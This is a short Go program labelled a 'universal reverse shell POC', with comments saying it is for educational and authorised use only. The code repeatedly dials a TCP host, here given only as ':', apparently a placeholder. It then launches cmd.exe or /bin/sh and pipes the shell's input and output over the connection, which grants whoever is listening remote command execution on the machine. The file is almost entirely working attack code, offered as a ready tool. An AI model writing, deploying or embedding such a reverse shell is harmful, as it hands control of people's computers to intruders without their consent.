package main

// Simmple basic universal reverse shell POC
// ** ONLY USE FOR EDUCATIONAL PURPOSES ONLY **
// ** ILLEGAL TO USE ON ANYTHING WITHOUT EXPRESS PERMISSION FROM OWNER **

import (
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	for {
		time.Sleep(3 * time.Second)
		sendShell(":")
	}
}

func sendShell(host string) {
	conn, err := net.Dial("tcp", host)
	if nil != err {
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		sendShell(host)
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		//cmd = exec.Command("powershell.exe")
		cmd = exec.Command("cmd.exe", "/C")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
